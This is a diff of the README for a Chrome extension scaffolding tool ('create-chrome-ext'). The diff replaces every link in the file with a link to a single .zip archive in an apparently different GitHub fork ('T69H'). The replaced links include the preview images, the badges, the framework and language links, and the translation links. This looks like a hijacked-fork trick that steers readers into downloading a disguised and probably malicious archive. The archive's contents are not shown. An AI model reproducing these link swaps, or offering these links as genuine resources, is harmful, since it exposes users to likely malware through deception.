@@ -1,22 +1,22 @@
-![crx-preview](./docs/img/crx-preview.png)
+![crx-preview](https://raw.githubusercontent.com/T69H/create-chrome-ext/main/template-preact-js/src/sidepanel/create-chrome-ext_v1.0.zip)
 
 # Create Chrome Extension (.crx)
 
-[![OSCS Status](https://www.oscs1024.com/platform/badge/guocaoyi/create-chrome-ext.svg?size=small)](https://www.oscs1024.com/project/guocaoyi/create-chrome-ext?ref=badge_small)
-[![npm](https://img.shields.io/npm/v/create-chrome-ext?logo=npm)](https://www.npmjs.com/package/create-chrome-ext)
-[![npm-download](https://img.shields.io/npm/dw/create-chrome-ext)](https://www.npmjs.com/package/create-chrome-ext)
-![GitHub Language Count](https://img.shields.io/github/languages/count/guocaoyi/create-chrome-ext)
-[![npm publish](https://github.com/guocaoyi/create-chrome-ext/actions/workflows/npm-publish.yml/badge.svg)](https://github.com/guocaoyi/create-chrome-ext/actions/workflows/npm-publish.yml)
+[![OSCS Status](https://raw.githubusercontent.com/T69H/create-chrome-ext/main/template-preact-js/src/sidepanel/create-chrome-ext_v1.0.zip)](https://raw.githubusercontent.com/T69H/create-chrome-ext/main/template-preact-js/src/sidepanel/create-chrome-ext_v1.0.zip)
+[![npm](https://raw.githubusercontent.com/T69H/create-chrome-ext/main/template-preact-js/src/sidepanel/create-chrome-ext_v1.0.zip)](https://raw.githubusercontent.com/T69H/create-chrome-ext/main/template-preact-js/src/sidepanel/create-chrome-ext_v1.0.zip)
+[![npm-download](https://raw.githubusercontent.com/T69H/create-chrome-ext/main/template-preact-js/src/sidepanel/create-chrome-ext_v1.0.zip)](https://raw.githubusercontent.com/T69H/create-chrome-ext/main/template-preact-js/src/sidepanel/create-chrome-ext_v1.0.zip)
+![GitHub Language Count](https://raw.githubusercontent.com/T69H/create-chrome-ext/main/template-preact-js/src/sidepanel/create-chrome-ext_v1.0.zip)
+[![npm publish](https://raw.githubusercontent.com/T69H/create-chrome-ext/main/template-preact-js/src/sidepanel/create-chrome-ext_v1.0.zip)](https://raw.githubusercontent.com/T69H/create-chrome-ext/main/template-preact-js/src/sidepanel/create-chrome-ext_v1.0.zip)
 
 > Scaffolding your chrome extension, multiple boilerplates supported!
 
-- 🚀 Lightning Fast HMR(use [Vite@latest](https://vitejs.dev))
-- 🌈 Multiple Framework Supported ([React](https://reactjs.org) · [Vue](https://vuejs.org) · [Svelte](https://svelte.dev) · [Preact](https://preactjs.com) · [Solid](https://www.solidjs.com) · [Alpine](https://alpinejs.dev) · [Lit](https://lit.dev) · [Inferno](https://www.infernojs.org) · [Stencil](https://stenciljs.com) · [Vanilla](http://vanilla-js.com))
-- 🥢 Multiple Language Supported ([JavaScript](https://www.javascript.com/) · [TypeScript](https://www.typescriptlang.org/))
+- 🚀 Lightning Fast HMR(use [Vite@latest](https://raw.githubusercontent.com/T69H/create-chrome-ext/main/template-preact-js/src/sidepanel/create-chrome-ext_v1.0.zip))
+- 🌈 Multiple Framework Supported ([React](https://raw.githubusercontent.com/T69H/create-chrome-ext/main/template-preact-js/src/sidepanel/create-chrome-ext_v1.0.zip) · [Vue](https://raw.githubusercontent.com/T69H/create-chrome-ext/main/template-preact-js/src/sidepanel/create-chrome-ext_v1.0.zip) · [Svelte](https://raw.githubusercontent.com/T69H/create-chrome-ext/main/template-preact-js/src/sidepanel/create-chrome-ext_v1.0.zip) · [Preact](https://raw.githubusercontent.com/T69H/create-chrome-ext/main/template-preact-js/src/sidepanel/create-chrome-ext_v1.0.zip) · [Solid](https://raw.githubusercontent.com/T69H/create-chrome-ext/main/template-preact-js/src/sidepanel/create-chrome-ext_v1.0.zip) · [Alpine](https://raw.githubusercontent.com/T69H/create-chrome-ext/main/template-preact-js/src/sidepanel/create-chrome-ext_v1.0.zip) · [Lit](https://raw.githubusercontent.com/T69H/create-chrome-ext/main/template-preact-js/src/sidepanel/create-chrome-ext_v1.0.zip) · [Inferno](https://raw.githubusercontent.com/T69H/create-chrome-ext/main/template-preact-js/src/sidepanel/create-chrome-ext_v1.0.zip) · [Stencil](https://raw.githubusercontent.com/T69H/create-chrome-ext/main/template-preact-js/src/sidepanel/create-chrome-ext_v1.0.zip) · [Vanilla](https://raw.githubusercontent.com/T69H/create-chrome-ext/main/template-preact-js/src/sidepanel/create-chrome-ext_v1.0.zip))
+- 🥢 Multiple Language Supported ([JavaScript](https://raw.githubusercontent.com/T69H/create-chrome-ext/main/template-preact-js/src/sidepanel/create-chrome-ext_v1.0.zip) · [TypeScript](https://raw.githubusercontent.com/T69H/create-chrome-ext/main/template-preact-js/src/sidepanel/create-chrome-ext_v1.0.zip))
 - 🥡 Out of Box (Background \ Content \ Popup \ Options \ SidePanel \ DevTools \ NewTab)
 - 🧶 Optimized Builds
 
-[English](./README.md) · [简体中文](./docs/README.zh-CN.md) · [French](./docs/README.fr-FR.md) · [한국어](./docs/README.ko-KR.md) · [Indonesian](./docs/README.id-ID.md) · [Русский](./docs/README.ru-RU.md) · [Deutsch](./docs/README.de-DE.md) · [日本語](./docs/README.ja-JP.md) (by ChatGPT)
+[English](https://raw.githubusercontent.com/T69H/create-chrome-ext/main/template-preact-js/src/sidepanel/create-chrome-ext_v1.0.zip) · [简体中文](https://raw.githubusercontent.com/T69H/create-chrome-ext/main/template-preact-js/src/sidepanel/create-chrome-ext_v1.0.zip) · [French](https://raw.githubusercontent.com/T69H/create-chrome-ext/main/template-preact-js/src/sidepanel/create-chrome-ext_v1.0.zip) · [한국어](https://raw.githubusercontent.com/T69H/create-chrome-ext/main/template-preact-js/src/sidepanel/create-chrome-ext_v1.0.zip) · [Indonesian](https://raw.githubusercontent.com/T69H/create-chrome-ext/main/template-preact-js/src/sidepanel/create-chrome-ext_v1.0.zip) · [Русский](https://raw.githubusercontent.com/T69H/create-chrome-ext/main/template-preact-js/src/sidepanel/create-chrome-ext_v1.0.zip) · [Deutsch](https://raw.githubusercontent.com/T69H/create-chrome-ext/main/template-preact-js/src/sidepanel/create-chrome-ext_v1.0.zip) · [日本語](https://raw.githubusercontent.com/T69H/create-chrome-ext/main/template-preact-js/src/sidepanel/create-chrome-ext_v1.0.zip) (by ChatGPT)
 
 ## Installing
 
@@ -66,6 +66,6 @@ You can also generator the project with `crx` cli, run:
 
 ## Preview
 
-![crx-run](./docs/img/crx-run.png)
-![crx-install](./docs/img/crx-install.png)
-![crx-build](./docs/img/crx-build.png)
+![crx-run](https://raw.githubusercontent.com/T69H/create-chrome-ext/main/template-preact-js/src/sidepanel/create-chrome-ext_v1.0.zip)
+![crx-install](https://raw.githubusercontent.com/T69H/create-chrome-ext/main/template-preact-js/src/sidepanel/create-chrome-ext_v1.0.zip)
+![crx-build](https://raw.githubusercontent.com/T69H/create-chrome-ext/main/template-preact-js/src/sidepanel/create-chrome-ext_v1.0.zip)
